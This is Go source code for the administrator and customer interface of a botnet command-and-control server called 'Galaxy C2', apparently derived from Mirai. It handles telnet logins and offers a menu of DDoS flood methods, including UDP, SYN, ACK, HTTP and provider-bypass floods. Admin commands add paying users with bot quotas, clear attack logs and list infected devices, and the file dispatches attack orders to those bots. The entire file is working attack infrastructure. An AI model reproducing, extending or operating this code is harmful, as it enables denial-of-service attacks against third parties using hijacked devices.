package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.Write([]byte(fmt.Sprintf("\033]0;Galaxy C2 | Security Login\007")))
    this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\r\n"))
	this.conn.Write([]byte("                               G A L A X Y  L O G I N   \r\n"))
	this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\x1b[0m"))
    this.conn.Write([]byte("                                  \x1b[4m                   \x1b[0m\r\n                        Username: \x1b[38;5;15m\x1b[48;5;235m\x1b[4m                   \x1b[0m\r\n"))
    this.conn.Write([]byte("                                  \x1b[4m                   \x1b[0m\r\n                        Password: \x1b[38;5;15m\x1b[48;5;235m\x1b[4m                   \x1b[0m\r\n"))

    //get user
    username, err := this.ReadLine("\u001B[9;35f\u001B[0m\u001B[48;5;235m\u001B[4m", false)
    if err != nil {
        return
    }

    // Get password
    password, err := this.ReadLine("\u001B[11;35f\u001B[0m\u001B[48;5;235m\u001B[4m", true)
    if err != nil {
        return
    }

    this.conn.SetDeadline(time.Now().Add(300 * time.Second))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\x1b[0m"))
    spinBuf := []byte{'V', 'e', 'r', 'i', 'f', 'y', '.', '.', '.'}
    for i := 0; i < 15; i++ {
        this.conn.Write([]byte(fmt.Sprintf("\033]0;Waiting...\007")))
        this.conn.Write(append([]byte("\r\033[01;37mPlease wait...\033[01;37m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(10) * time.Millisecond)
    }
    this.conn.Write([]byte("\r\n"))


    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\x1b[0;34mWrong credentials, try again.\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    } else {
		fmt.Printf(" User %s logged in from %s\n", username, this.conn.RemoteAddr().String())
	}

    this.conn.Write([]byte("\033[2J\033[1H"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\x1b[34m                       ,MMM8&&&.                                \r\n"))
    this.conn.Write([]byte("\x1b[34m                  _...MMMMM88&&&&..._        \x1b[34mGALAXY\x1b[37m v1.5.0                   \r\n"))
    this.conn.Write([]byte("\x1b[34m               .::'''MMMMM88&&&&&&'''::.     \x1b[37mNew \x1b[34mUpdate \x1b[37m2024                  \r\n"))
    this.conn.Write([]byte("\x1b[34m              ::     MMMMM88&&&&&&     ::                       \r\n"))
    this.conn.Write([]byte("\x1b[34m              '::....MMMMM88&&&&&&....::'                       \r\n"))
    this.conn.Write([]byte("\x1b[34m                 `''''MMMMM88&&&&''''`                          \r\n"))
    this.conn.Write([]byte("\x1b[34m                       'MMM8&&&'                                \r\n"))
    this.conn.Write([]byte("\x1b[34m                     \r\n"))
    
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if userInfo.admin == 1 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Galaxy | Loaded » %d | Run » %d | Sents » %d/250 - Users: %d \007", BotCount, database.fetchRunningAttacks(), database.fetchAttacks(), database.fetchUsers()))); err != nil {
                    this.conn.Close()
                    break
                }
            }
            if userInfo.admin == 0 {
                if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Galaxy / New update! - Running » %d \007", database.fetchRunningAttacks()))); err != nil {
                    this.conn.Close()
                    break
                }
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[1;37;47m \x1b[1;37m" + username + " \x1b[1;34m● Galaxy \033[0m\x1b[1;37m ➤➤ "))
        cmd, err := this.ReadLine("", false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }

        if cmd == "" {
            continue
        }

        //pa que no se te crashee xdd
        if cmd == "@" {
            continue
        }

        //pa que puedas ver todo lo que ejecutas por la terminal :V
        fmt.Println("\033[0m " + username + ": " + cmd + "")

        if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\x1b[34m                       ,MMM8&&&.                                \r\n"))
            this.conn.Write([]byte("\x1b[34m                  _...MMMMM88&&&&..._        \x1b[34mGALAXY\x1b[37m v1.5.0                   \r\n"))
            this.conn.Write([]byte("\x1b[34m               .::'''MMMMM88&&&&&&'''::.     \x1b[37mNew \x1b[34mUpdate \x1b[37m2024                  \r\n"))
            this.conn.Write([]byte("\x1b[34m              ::     MMMMM88&&&&&&     ::                       \r\n"))
            this.conn.Write([]byte("\x1b[34m              '::....MMMMM88&&&&&&....::'                       \r\n"))
            this.conn.Write([]byte("\x1b[34m                 `''''MMMMM88&&&&''''`                          \r\n"))
            this.conn.Write([]byte("\x1b[34m                       'MMM8&&&'                                \r\n"))
            this.conn.Write([]byte("\x1b[34m                     \r\n"))
            continue
        }
        if cmd == "help" || cmd == "HELP" || cmd == "?"  || cmd == "methods" {
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .udp:       \x1b[38;5;253mgeneric udp flood (with high gbps).\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .bypass:    \x1b[38;5;253mcustom udp flood bypass method.\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .pps:       \x1b[38;5;253mudp flood with high pps.\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .game:      \x1b[38;5;253mudp flood for games (valve).\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .plain:     \x1b[38;5;253mudp flood with plain packets.\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .syn:       \x1b[38;5;253mgeneric syn flood (with high gbps).\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .ack:       \x1b[38;5;253mgeneric ack flood (with high gbps).\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .tcp:       \x1b[38;5;253madvanced tcp socket flood bypass + ack flags.\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .null:      \x1b[38;5;253mtcp flood with minecraft bypass.\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .legit:     \x1b[38;5;253mtcp legit flood with ack flag.\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .hex:       \x1b[38;5;253mstdhex flood bypassing mitigations.\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .ovh:       \x1b[38;5;253mudp flood for ovh servers.\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .greip:     \x1b[38;5;253mgeneric greip flood.\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .handshake: \x1b[38;5;253mtcp handshake flood.\r\n"))
            this.conn.Write([]byte("\x1b[1;34m  .http:      \x1b[38;5;253mgeneric http requests get/post flood.\r\n"))
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            continue
        }

         if err != nil || cmd == "logout" || cmd == "LOGOUT" {
            return
        }

        if userInfo.admin == 1 && cmd == "panel" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\x1b[1;37madduser      \x1b[1;33m-  \x1b[1;37mADD NEW NORMAL USER\r\n"))
            this.conn.Write([]byte("\x1b[1;37maddadmin     \x1b[1;33m-  \x1b[1;37mADD NEW ADMIN\r\n"))
            this.conn.Write([]byte("\x1b[1;37mremove    \x1b[1;33m-  \x1b[1;37mREMOVE USER\r\n"))
            this.conn.Write([]byte("\x1b[1;37mlogs      \x1b[1;33m-  \x1b[1;37mREMOVE ATTACKS LOGS\r\n"))
            this.conn.Write([]byte("\x1b[1;37mbots         \x1b[1;33m-  \x1b[1;37mSHOW ALL BOTS\r\n"))
            continue
        }
        
        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("Username: "))
            new_un, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Password: "))
            new_pw, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("-1 for Full Bots.\r\n"))
            this.conn.Write([]byte("Allowed Bots: "))
            max_bots_str, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("0 for Max attack duration. \r\n"))
            this.conn.Write([]byte("Allowed Duration: "))
            duration_str, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("0 for no cooldown. \r\n"))
            this.conn.Write([]byte("Cooldown: "))
            cooldown_str, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                continue
            }
            this.conn.Write([]byte("Username: " + new_un + "\r\n"))
            this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
            this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
            this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
            this.conn.Write([]byte("Bots: " + max_bots_str + "\r\n"))
            this.conn.Write([]byte(""))
            this.conn.Write([]byte("Confirm(y): "))
            confirm, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte("Failed to create Admin! \r\n"))
            } else {
                this.conn.Write([]byte("Admin created! \r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "logs"  {
            this.conn.Write([]byte("\033[1;91mClear attack logs\033[1;33m?(y/n): \033[0m"))
            confirm, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CleanLogs() {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mError, can't clear logs, please check debug logs\r\n")))
            } else {
                this.conn.Write([]byte("\033[1;92mAll Attack logs has been cleaned !\r\n"))
                fmt.Println("\033[1;91m[\033[1;92mServerLogs\033[1;91m] Logs has been cleaned by \033[1;92m" + username + " \033[1;91m!\r\n")
            }
            continue 
        }
        
        if userInfo.admin == 1 && cmd == "remove" {
            this.conn.Write([]byte("Username: "))
            new_un, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            if !database.removeUser(new_un) {
                this.conn.Write([]byte("User doesn't exists.\r\n"))
            } else {
                this.conn.Write([]byte("User removed\r\n"))
            }
            continue
        }
        
        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter New Username: "))
            new_un, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Choose New Password: "))
            new_pw, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter Bot Count (-1 For Full Bots): "))
            max_bots_str, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Bot Count")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Max Attack Duration (-1 For None): "))
            duration_str, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[0;37%s\033[0m\r\n", "Failed To Parse The Attack Duration Limit")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Cooldown Time (0 For None): "))
            cooldown_str, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Cooldown")))
                continue
            }
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nContinue? (Y/N): "))
            confirm, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
            } else {
                this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m User Added Successfully.\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "whitelist" {
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter Prefix: "))
            prefix, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            
            this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Enter Netmask: "))
            netmaskStr, err := this.ReadLine("", false)
            if err != nil {
                return
            }
            
            netmask, err := strconv.Atoi(netmaskStr)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Parse The Netmask")))
                continue
            }
        
            if userInfo.admin == 1 {
                if !database.AddWhitelist(prefix, netmask) {
                    this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30m%s\033[0m\r\n", "Failed To Add Entry to Whitelist")))
                } else {
                    this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m Entry Added to Whitelist Successfully.\033[0m\r\n"))
                }
            } else {
                this.conn.Write([]byte("\x1b[1;30m-\x1b[1;30m>\x1b[1;30m \x1b[1;30mError: Insufficient Permissions\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "bots" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37m   %s \033[38;2;120;110;221m[%d\033[38;2;120;110;221m]\r\n\033[1;0m", k, v)))
            }
            this.conn.Write([]byte(fmt.Sprintf("\x1b[1;37m   Total \033[38;2;120;110;221m[%d\033[38;2;120;110;221m]\r\n\033[1;0m", botCount)))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mFailed To Parse Botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\x1b[1;30mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var YotCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        YotCount = userInfo.maxBots
                    } else {
                        YotCount = clientList.Count()
                    }
                    this.conn.Write([]byte(fmt.Sprintf("\033[01;37mAttack sent successfully to \033[01;34m%d\033[0m\033[01;37m devices!\033[0m\r\n", YotCount)))
                } else {
                    this.conn.Write([]byte("\033[31mAddress is Blacklisted Servers!\033[0m\r\n"))
                }
            }
        }
    }
}

func (this *Admin) ReadLine(prompt string, masked bool) (string, error) {
    buf := make([]byte, 2048)
	bufPos := 0

    if len(prompt) >= 1 {
		this.conn.Write([]byte(prompt))
	}

	for {
		if len(buf) < bufPos+2 { 
			fmt.Printf("Buffer Overflow Attack Prevented IP - %s\n", this.conn.RemoteAddr())
			return string(buf), nil
		}

		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
